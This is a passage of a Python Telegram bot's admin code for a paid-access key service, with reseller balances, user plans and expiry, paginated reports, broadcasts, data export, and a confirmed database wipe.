    if not resellers_data: return bot.reply_to(message, "⚠️ No resellers found.", parse_mode="HTML")
    send_resellers_page(message.chat.id, list(resellers_data.items()), 0)

def send_resellers_page(chat_id, res_list, page, message_id=None):
    per_page = 15
    total_pages = max(1, (len(res_list) + per_page - 1) // per_page)
    page_items = res_list[page*per_page : (page+1)*per_page]
    
    text = f"🤝 <b>𝗥𝗘𝗦𝗘𝗟𝗟𝗘𝗥𝗦 (Page {page+1}/{total_pages})</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for uid, username in page_items: text += f"🆔 <code>{uid}</code> ({username}) → ₹{get_balance(uid)}\n"
    
    markup = gen_page_markup("respage", page, total_pages)
    if message_id: bot.edit_message_text(text, chat_id, message_id, reply_markup=markup, parse_mode="HTML")
    else: bot.send_message(chat_id, text, reply_markup=markup, parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data.startswith("respage_"))
def respage_callback(call):
    page = int(call.data.split("_")[1])
    send_resellers_page(call.message.chat.id, list(resellers_data.items()), page, call.message.message_id)
    bot.answer_callback_query(call.id)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  CONVERSATIONAL ADMIN COMMANDS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@bot.message_handler(commands=['admincmd'])
def admin_commands(message):
    if not is_admin(str(message.chat.id)): return bot.reply_to(message, admin_only_msg(), parse_mode="HTML")
    bot.reply_to(message,
        "🛠 <b>𝗔𝗗𝗠𝗜𝗡 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
        "👤 <b>USERS</b>\n🔹 /add | /remove\n🔹 /paidusers | /freeusers\n🔹 /extendall\n🔹 /trialkey | /killtrial\n\n"
        "🤝 <b>RESELLERS</b>\n🔸 /addreseller | /rmreseller\n🔸 /resellerstats | /resellers\n🔸 /addbalance | /setbalance\n\n"
        "📢 <b>BROADCAST & DATA</b>\n🔊 /broadcast | /bcpaid | /bcreseller\n📄 /logs | 🗑 /clearlogs\n📦 /getdata (Download Full Ledger)\n⚠️ /clearalldata (Wipe Database)\n━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode="HTML"
    )

@bot.message_handler(commands=['add'])
def add_user_cmd(message):
    if not is_admin(str(message.chat.id)): return bot.reply_to(message, admin_only_msg(), parse_mode="HTML")
    parts = message.text.split()
    if len(parts) >= 3: execute_add(message, parts[1], parts[2])
    else:
        msg = bot.reply_to(message, "👤 <b>Enter the User ID to add:</b>\n<i>(Type /cancel to abort)</i>", parse_mode="HTML")
        bot.register_next_step_handler(msg, add_step_id)

def add_step_id(message):
    if is_cancel(message): return
    target = message.text.strip()
    msg = bot.reply_to(message, f"📦 <b>Which plan?</b> ({', '.join(KEY_PLANS.keys())})", parse_mode="HTML")
    bot.register_next_step_handler(msg, add_step_plan, target)

def add_step_plan(message, target):
    if is_cancel(message): return
    execute_add(message, target, message.text.strip())

def execute_add(message, target, plan):
    if plan not in KEY_PLANS: return bot.reply_to(message, "❌ Invalid plan.", parse_mode="HTML")
    expiry_ts = (datetime.datetime.now(ist) + KEY_PLANS[plan]["duration"]).timestamp()
    if target not in allowed_user_ids:
        allowed_user_ids.append(target)
        save_users(allowed_user_ids)
        prefix = "✅ <b>User Added</b>"
    else: prefix = "🔄 <b>Access Updated</b>"
    user_access[target] = {"expiry_time": expiry_ts}
    save_user_access(user_access)
    all_known_users.add(target)
    save_file_lines(ALL_USERS_FILE, all_known_users)
    log_action(str(message.chat.id), f"Added user={target} plan={plan}", message)
    bot.reply_to(message, f"{prefix}\n🆔 <b>ID:</b> <code>{target}</code>\n⏳ <b>Expires:</b> {fmt_expiry(expiry_ts)}", parse_mode="HTML")

@bot.message_handler(commands=['remove', 'rmreseller'])
def remove_targets_cmd(message):
    if not is_admin(str(message.chat.id)): return bot.reply_to(message, admin_only_msg(), parse_mode="HTML")
    cmd = message.text.split()[0].lower()
    parts = message.text.split()
    if len(parts) >= 2: execute_remove(message, cmd, parts[1])
    else:
        msg = bot.reply_to(message, f"🗑️ <b>Enter the ID to remove:</b>\n<i>(Type /cancel to abort)</i>", parse_mode="HTML")
        bot.register_next_step_handler(msg, remove_step_id, cmd)

def remove_step_id(message, cmd):
    if is_cancel(message): return
    execute_remove(message, cmd, message.text.strip())

def execute_remove(message, cmd, target):
    if cmd == '/remove':
        if target in allowed_user_ids:
            allowed_user_ids.remove(target); user_access.pop(target, None)
            save_users(allowed_user_ids); save_user_access(user_access)
            bot.reply_to(message, f"✅ <b>User {target} removed.</b>", parse_mode="HTML")
        else: bot.reply_to(message, "❌ User not found.", parse_mode="HTML")
    else:
        if target in resellers_data:
            del resellers_data[target]; save_resellers(resellers_data)
            bot.reply_to(message, f"✅ <b>Reseller {target} removed.</b>", parse_mode="HTML")

@bot.message_handler(commands=['addreseller'])
def addreseller_cmd(message):
    if not is_admin(str(message.chat.id)): return bot.reply_to(message, admin_only_msg(), parse_mode="HTML")
    parts = message.text.split()
    if len(parts) >= 3: execute_addreseller(message, parts[1], parts[2])
    else:
        msg = bot.reply_to(message, "🤝 <b>Enter the new Reseller's Telegram ID:</b>\n<i>(Type /cancel to abort)</i>", parse_mode="HTML")
        bot.register_next_step_handler(msg, addres_step_id)

def addres_step_id(message):
    if is_cancel(message): return
    target = message.text.strip()
    msg = bot.reply_to(message, "💰 <b>Enter Initial Balance:</b>", parse_mode="HTML")
    bot.register_next_step_handler(msg, addres_step_bal, target)

def addres_step_bal(message, target):
    if is_cancel(message): return
    execute_addreseller(message, target, message.text.strip())

def execute_addreseller(message, target, bal_str):
    try: initial_bal = int(bal_str)
    except ValueError: return bot.reply_to(message, "❌ Balance must be a number.", parse_mode="HTML")
    
    resellers_data[target] = "Unknown"
    balances[target] = get_balance(target) + initial_bal
    save_resellers(resellers_data); save_balances(balances)
    log_action(str(message.chat.id), f"Added reseller={target} with {initial_bal}", message)
    
    bot.reply_to(message, f"✅ <b>Reseller Added!</b>\n🆔 <b>ID:</b> <code>{target}</code>\n💵 <b>Starting Balance:</b> ₹{balances[target]}\n<i>(Username will auto-update when they use the bot)</i>", parse_mode="HTML")
    
    try:
        bot.send_message(target, f"💰 <b>𝗬𝗼𝘂 𝗔𝗿𝗲 𝗣𝗿𝗼𝗺𝗼𝘁𝗲𝗱 𝗧𝗼 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿!</b>\n━━━━━━━━━━━━━━━━━━━━━━\n💵 <b>Balance:</b> ₹{balances[target]}\n🔑 <b>Total Keys Generated:</b> 0\n\n📋 <i>Use /prices to see key prices</i>\n🔑 <i>Use /genkey to generate</i>", parse_mode="HTML")
    except Exception:
        bot.reply_to(message, f"⚠️ Note: Promotion message wasn't sent. They need to start the bot first.", parse_mode="HTML")

@bot.message_handler(commands=['addbalance', 'setbalance'])
def addbalance_cmd(message):
    if not is_admin(str(message.chat.id)): return bot.reply_to(message, admin_only_msg(), parse_mode="HTML")
    cmd = message.text.split()[0].lower()
    parts = message.text.split()
    if len(parts) >= 3: execute_balance_change(message, cmd, parts[1], parts[2])
    else:
        msg = bot.reply_to(message, "👤 <b>Enter the Reseller's Telegram ID:</b>\n<i>(Type /cancel to abort)</i>", parse_mode="HTML")
        bot.register_next_step_handler(msg, bal_step_id, cmd)

def bal_step_id(message, cmd):
    if is_cancel(message): return
    target = message.text.strip()
    msg = bot.reply_to(message, "💰 <b>Enter the amount:</b>", parse_mode="HTML")
    bot.register_next_step_handler(msg, bal_step_amt, cmd, target)

def bal_step_amt(message, cmd, target):
    if is_cancel(message): return
    execute_balance_change(message, cmd, target, message.text.strip())

def execute_balance_change(message, cmd, target, amount_str):
    try: amount = int(amount_str)
    except ValueError: return bot.reply_to(message, "❌ Amount must be a number.", parse_mode="HTML")
    if target not in resellers_data: return bot.reply_to(message, "❌ User is not a reseller.", parse_mode="HTML")
    if cmd == '/addbalance' and amount <= 0: return bot.reply_to(message, "❌ Must be > 0.", parse_mode="HTML")
    if cmd == '/setbalance' and amount < 0: return bot.reply_to(message, "❌ Must be >= 0.", parse_mode="HTML")

    balances[target] = get_balance(target) + amount if cmd == '/addbalance' else amount
    save_balances(balances)
    
    bot.reply_to(message, f"✅ <b>𝗕𝗮𝗹𝗮𝗻𝗰𝗲 Updated!</b>\n👤 <b>Reseller:</b> {resellers_data.get(target)} (<code>{target}</code>)\n💵 <b>New Balance:</b> ₹{balances[target]}", parse_mode="HTML")
    try: bot.send_message(target, f"💰 <b>𝗬𝗼𝘂𝗿 𝗕𝗮𝗹𝗮𝗻𝗰𝗲 𝗛𝗮𝘀 𝗕𝗲𝗲𝗻 𝗨𝗽𝗱𝗮𝘁𝗲𝗱!</b>\n💵 <b>Current Balance:</b> ₹{balances[target]}", parse_mode="HTML")
    except: pass

@bot.message_handler(commands=['extendall'])
def extendall_cmd(message):
    if not is_admin(str(message.chat.id)): return bot.reply_to(message, admin_only_msg(), parse_mode="HTML")
    parts = message.text.split()
    if len(parts) >= 3: execute_extendall(message, parts[1], parts[2])
    else:
        msg = bot.reply_to(message, "⏳ <b>Enter amount to extend (e.g. 2):</b>\n<i>(Type /cancel to abort)</i>", parse_mode="HTML")
        bot.register_next_step_handler(msg, ext_step_amt)

def ext_step_amt(message):
    if is_cancel(message): return
    amount_str = message.text.strip()
    msg = bot.reply_to(message, "📅 <b>Enter unit (hours or days):</b>", parse_mode="HTML")
    bot.register_next_step_handler(msg, ext_step_unit, amount_str)

def ext_step_unit(message, amount_str):
    if is_cancel(message): return
    execute_extendall(message, amount_str, message.text.strip())

def execute_extendall(message, amount_str, unit):
    try: amount = int(amount_str)
    except: return bot.reply_to(message, "❌ Amount must be a number.", parse_mode="HTML")
    unit = unit.lower()
    time_to_add = timedelta(hours=amount) if "hour" in unit else (timedelta(days=amount) if "day" in unit else None)
    if not time_to_add: return bot.reply_to(message, "❌ Unit must be 'hours' or 'days'.")

    users_ext, now = 0, time.time()
    for uid in list(user_access.keys()):
        if user_access[uid]["expiry_time"] > now:
            user_access[uid]["expiry_time"] = (datetime.datetime.fromtimestamp(user_access[uid]["expiry_time"]) + time_to_add).timestamp()
            users_ext += 1
    save_user_access(user_access)
    bot.reply_to(message, f"🎉 <b>𝗧𝗶𝗺𝗲 𝗘𝘅𝘁𝗲𝗻𝗱𝗲𝗱!</b>\n⏰ <b>Added:</b> {amount} {unit}\n👥 <b>Users Updated:</b> {users_ext}", parse_mode="HTML")

@bot.message_handler(commands=['broadcast', 'bcpaid', 'bcreseller'])
def broadcast_cmd(message):
    if not is_admin(str(message.chat.id)): return bot.reply_to(message, admin_only_msg(), parse_mode="HTML")
    cmd = message.text.split()[0].lower()
    parts = message.text.split(maxsplit=1)
    if len(parts) > 1: execute_broadcast(message, cmd, parts[1])
    else:
        msg = bot.reply_to(message, "📢 <b>Enter the message to broadcast:</b>\n<i>(Type /cancel to abort)</i>", parse_mode="HTML")
        bot.register_next_step_handler(msg, broadcast_step, cmd)

def broadcast_step(message, cmd):
    if is_cancel(message): return
    execute_broadcast(message, cmd, message.text)

def execute_broadcast(message, cmd, text_content):
    if cmd == '/bcreseller': targets = set(resellers_data.keys())
    elif cmd == '/bcpaid': targets = set(allowed_user_ids)
    else: targets = all_known_users | set(allowed_user_ids) | set(resellers_data.keys()) | ADMIN_IDS

    targets = list(targets)
    text = f"📢 <b>𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧</b>\n━━━━━━━━━━━━━━━━━━━━━━\n\n{text_content}\n\n━━━━━━━━━━━━━━━━━━━━━━"
    
    bot.reply_to(message, f"⏳ <i>Broadcasting to {len(targets)} users in progress...</i>", parse_mode="HTML")
    success, fail = 0, 0
    
    for t in targets:
        try: bot.send_message(t, text, parse_mode="HTML"); success += 1; time.sleep(0.05) 
        except: fail += 1

    bot.reply_to(message, f"📢 <b>Broadcast Done</b>\n✅ Sent: {success}\n❌ Failed: {fail}", parse_mode="HTML")

@bot.message_handler(commands=['paidusers', 'freeusers', 'resellerstats'])
def admin_reports(message):
    if not is_admin(str(message.chat.id)): return bot.reply_to(message, admin_only_msg(), parse_mode="HTML")
    cmd = message.text.split()[0].lower()
    if cmd == '/paidusers':
        paid = [u for u in allowed_user_ids if u not in trial_users]
        if not paid: return bot.reply_to(message, "⚠️ No paid users found.", parse_mode="HTML")
        send_paidusers_page(message.chat.id, paid, 0)
    elif cmd == '/freeusers':
        free = [u for u in all_known_users if u not in allowed_user_ids]
        if not free: return bot.reply_to(message, "⚠️ No free users found.", parse_mode="HTML")
        send_freeusers_page(message.chat.id, free, 0)
    elif cmd == '/resellerstats':
        if not resellers_data: return bot.reply_to(message, "⚠️ No resellers found.", parse_mode="HTML")
        send_rstats_page(message.chat.id, list(resellers_data.items()), 0)

# Paginated Reports Helpers
def send_paidusers_page(chat_id, users_list, page, message_id=None):
    per_page = 20
    total_pages = max(1, (len(users_list) + per_page - 1) // per_page)
    page_items = users_list[page*per_page : (page+1)*per_page]
    text = f"💎 <b>𝗣𝗔𝗜𝗗 𝗨𝗦𝗘𝗥𝗦 (Page {page+1}/{total_pages})</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for uid in page_items: text += f"🆔 <code>{uid}</code> [Exp: {fmt_expiry(user_access.get(uid, {}).get('expiry_time', 0))}]\n"
    markup = gen_page_markup("paid", page, total_pages)
    if message_id: bot.edit_message_text(text, chat_id, message_id, reply_markup=markup, parse_mode="HTML")
    else: bot.send_message(chat_id, text, reply_markup=markup, parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data.startswith("paid_"))
def paid_page_callback(call):
    page = int(call.data.split("_")[1])
    paid = [u for u in allowed_user_ids if u not in trial_users]
    send_paidusers_page(call.message.chat.id, paid, page, call.message.message_id)
    bot.answer_callback_query(call.id)

def send_freeusers_page(chat_id, users_list, page, message_id=None):
    per_page = 30
    total_pages = max(1, (len(users_list) + per_page - 1) // per_page)
    page_items = users_list[page*per_page : (page+1)*per_page]
    text = f"🆓 <b>𝗙𝗥𝗘𝗘 𝗨𝗦𝗘𝗥𝗦 (Page {page+1}/{total_pages})</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for uid in page_items: text += f"🆔 <code>{uid}</code>\n"
    markup = gen_page_markup("free", page, total_pages)
    if message_id: bot.edit_message_text(text, chat_id, message_id, reply_markup=markup, parse_mode="HTML")
    else: bot.send_message(chat_id, text, reply_markup=markup, parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data.startswith("free_"))
def free_page_callback(call):
    page = int(call.data.split("_")[1])
    free = [u for u in all_known_users if u not in allowed_user_ids]
    send_freeusers_page(call.message.chat.id, free, page, call.message.message_id)
    bot.answer_callback_query(call.id)

def send_rstats_page(chat_id, res_list, page, message_id=None):
    per_page = 15
    total_pages = max(1, (len(res_list) + per_page - 1) // per_page)
    page_items = res_list[page*per_page : (page+1)*per_page]
    text = f"📊 <b>𝗥𝗘𝗦𝗘𝗟𝗟𝗘𝗥 𝗦𝗧𝗔𝗧𝗦 (Page {page+1}/{total_pages})</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for uid, username in page_items: text += f"👤 {username} (<code>{uid}</code>)\n💵 Bal: ₹{get_balance(uid)} | 🔑 Keys: {count_keys_generated_by(uid)}\n\n"
    markup = gen_page_markup("rstat", page, total_pages)
    if message_id: bot.edit_message_text(text, chat_id, message_id, reply_markup=markup, parse_mode="HTML")
    else: bot.send_message(chat_id, text, reply_markup=markup, parse_mode="HTML")

@bot.callback_query_handler(func=lambda call: call.data.startswith("rstat_"))
def rstat_page_callback(call):
    page = int(call.data.split("_")[1])
    send_rstats_page(call.message.chat.id, list(resellers_data.items()), page, call.message.message_id)
    bot.answer_callback_query(call.id)

@bot.message_handler(commands=['getdata'])
def send_database_files(message):
    if not is_admin(str(message.chat.id)): return
    bot.reply_to(message, "📦 <b>Fetching Database Files & Building Ledger...</b>", parse_mode="HTML")
    summary_path = os.path.join(DATA_DIR, "Human_Readable_Ledger.txt")
    with open(summary_path, "w", encoding="utf-8") as sf:
        sf.write("========== 📊 MASTER DATABASE SUMMARY ==========\n")
        sf.write(f"Generated: {datetime.datetime.now(ist).strftime('%d %b %Y %I:%M %p')}\n\n")
        sf.write("========== 🤝 RESELLER LEDGERS ==========\n")
        for uid, username in resellers_data.items():
            sf.write(f"Reseller: {username} (ID: {uid})\nLeftover Balance: ₹{get_balance(uid)}\n")
            r_keys = {k: v for k, v in key_history.items() if v["creator"] == uid}
            unused, used = [k for k, v in r_keys.items() if v["status"] == "UNUSED"], [k for k, v in r_keys.items() if str(v["status"]).startswith("USED")]
            sf.write(f"Total Keys Generated: {len(r_keys)}\n  🟢 Unused Keys ({len(unused)}):\n")
            for k in unused: sf.write(f"    - {k} [{r_keys[k]['plan']}]\n")
            sf.write(f"  🔴 Used Keys ({len(used)}):\n")
            for k in used: sf.write(f"    - {k} [{r_keys[k]['plan']}] -> {r_keys[k]['status']}\n")
            sf.write("-" * 45 + "\n\n")
        sf.write("========== 👤 ACTIVE PREMIUM USERS ==========\n")
        for uid, info in user_access.items(): sf.write(f"ID: {uid} | Expiry: {fmt_expiry(info['expiry_time'])}\n")
    
    found = False
    for fp in [summary_path, USER_ACCESS_FILE, KEYS_FILE, RESELLERS_FILE, BALANCE_FILE, ALL_USERS_FILE, TRIAL_KEYS_FILE, TRIAL_USERS_FILE, LOG_FILE]:
        if os.path.exists(fp) and os.stat(fp).st_size > 0:
            with open(fp, "rb") as f: bot.send_document(message.chat.id, f, visible_file_name=os.path.basename(fp))
            found = True
    if not found: bot.reply_to(message, "⚠️ <b>No data files found yet.</b>", parse_mode="HTML")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  DANGER ZONE: WIPE DATABASE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@bot.message_handler(commands=['clearalldata'])
def clearalldata_cmd(message):
    if not is_admin(str(message.chat.id)): return
    msg = bot.reply_to(message, "⚠️ <b>WARNING: EXTREME DANGER</b> ⚠️\nThis will wipe ALL users, resellers, balances, and keys. This cannot be undone.\n\nType exactly <code>CONFIRM WIPE</code> to proceed, or /cancel to abort.", parse_mode="HTML")
    bot.register_next_step_handler(msg, clearalldata_step)

def clearalldata_step(message):
    if is_cancel(message): return
    if message.text.strip() == "CONFIRM WIPE":
        all_known_users.clear(); trial_users.clear(); allowed_user_ids.clear()
        user_access.clear(); active_keys.clear(); key_history.clear()
        resellers_data.clear(); trial_keys.clear(); balances.clear()
        
        files_to_wipe = [USER_FILE, LOG_FILE, USER_ACCESS_FILE, KEYS_FILE, KEY_HISTORY_FILE, RESELLERS_FILE, BALANCE_FILE, ALL_USERS_FILE, TRIAL_KEYS_FILE, TRIAL_USERS_FILE]
        for f in files_to_wipe:
            if os.path.exists(f): open(f, 'w').close()
            
        bot.reply_to(message, "✅ <b>DATABASE COMPLETELY WIPED.</b> Everything has been reset to zero.", parse_mode="HTML")
        log_action(str(message.chat.id), "EXECUTED FULL DATABASE WIPE", message)
    else: bot.reply_to(message, "🚫 <b>Confirmation failed. Wipe cancelled.</b>", parse_mode="HTML")

@bot.message_handler(commands=['logs'])
def send_logs(message):
    if not is_admin(str(message.chat.id)): return
    if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
        with open(LOG_FILE, "rb") as f: bot.send_document(message.chat.id, f, visible_file_name="bot_logs.txt")
    else: bot.reply_to(message, "⚠️ Logs are empty.", parse_mode="HTML")

@bot.message_handler(commands=['clearlogs'])
def clear_logs_cmd(message):
    if not is_admin(str(message.chat.id)): return
    if os.path.exists(LOG_FILE): open(LOG_FILE, "w").close(); bot.reply_to(message, "✅ <b>Logs wiped.</b>", parse_mode="HTML")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  ENTRY POINT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
if __name__ == "__main__":
    remove_expired_users()
    print("   ✅ Bot is running perfectly with Pagination & Threading Enabled!")
    bot.infinity_polling(skip_pending=True, timeout=30, long_polling_timeout=20)
